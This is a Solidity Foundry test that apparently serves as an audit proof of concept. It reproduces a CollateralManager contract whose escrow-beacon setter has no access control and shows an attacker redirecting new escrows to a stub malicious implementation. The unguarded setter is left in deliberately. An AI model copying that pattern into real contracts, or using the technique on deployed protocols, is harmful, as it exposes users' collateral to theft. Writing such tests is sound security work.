pragma solidity 0.8.20;

import "forge-std/Test.sol";

interface ITellerV2 {
    function getLoanBorrower(uint256 _bidId) external view returns (address);
}

// Minimal proxy that just records the implementation passed in constructor
contract SimpleProxy {
    address public implementation;
    constructor(address _impl, bytes memory) {
        implementation = _impl;
        // ignore init data for brevity
    }
}

contract MaliciousEscrow {
    // malicious logic would live here
    function pwn() external pure returns (string memory) {
        return "owned";
    }
}

// Minimal vulnerable replica
contract CollateralManager {
    ITellerV2 public tellerV2;
    address public collateralEscrowBeacon; // vulnerable: no access control on setter in original
    mapping(uint256 => address) public _escrows;
    event CollateralEscrowDeployed(uint256 _bidId, address _collateralEscrow);

    function initialize(address _collateralEscrowBeacon, address _tellerV2) external {
        collateralEscrowBeacon = _collateralEscrowBeacon;
        tellerV2 = ITellerV2(_tellerV2);
    }

    // Vulnerable function: no owner/role check
    function setCollateralEscrowBeacon(address _collateralEscrowBeacon) external {
        collateralEscrowBeacon = _collateralEscrowBeacon;
    }

    // Exposed helper to demonstrate _deployEscrow behavior
    function deployAndDepositPublic(uint256 _bidId) external {
        (address proxyAddress, ) = _deployEscrow(_bidId);
        _escrows[_bidId] = proxyAddress;
        emit CollateralEscrowDeployed(_bidId, proxyAddress);
    }

    function _deployEscrow(uint256 _bidId) internal returns (address proxyAddress_, address borrower_) {
        proxyAddress_ = _escrows[_bidId];
        borrower_ = tellerV2.getLoanBorrower(_bidId);
        require(borrower_ != address(0), "Bid does not exist");
        if (proxyAddress_ == address(0)) {
            // In the real contract a BeaconProxy is created using collateralEscrowBeacon.
            // Here we simulate that by deploying a SimpleProxy with implementation = collateralEscrowBeacon
            SimpleProxy proxy = new SimpleProxy(collateralEscrowBeacon, abi.encodeWithSelector(bytes4(0)));
            proxyAddress_ = address(proxy);
        }
    }

    function getEscrow(uint256 _bidId) external view returns (address) {
        return _escrows[_bidId];
    }
}

// Simple Teller stub returning a non-zero borrower for bidId 1
contract TellerV2Mock is ITellerV2 {
    function getLoanBorrower(uint256 _bidId) external pure returns (address) {
        if (_bidId == 1) return address(0xBEEF);
        return address(0);
    }
}

contract CollateralManagerTest is Test {
    CollateralManager target;
    TellerV2Mock teller;
    address attacker;
    MaliciousEscrow malicious;

    function setUp() public {
        teller = new TellerV2Mock();
        target = new CollateralManager();
        target.initialize(address(0xDEAD), address(teller));
        attacker = makeAddr("attacker");
        malicious = new MaliciousEscrow();
    }

    function test_attacker_exploits_setCollateralEscrowBeacon() public {
        // Attacker can call the setter despite it being a reinitializer in the real contract
        vm.prank(attacker);
        target.setCollateralEscrowBeacon(address(malicious));

        // Now when the contract deploys an escrow, it will point at the malicious implementation
        target.deployAndDepositPublic(1);
        address escrow = target.getEscrow(1);

        // The created proxy should have recorded the malicious implementation address
        assertEq(SimpleProxy(escrow).implementation(), address(malicious));
    }
}

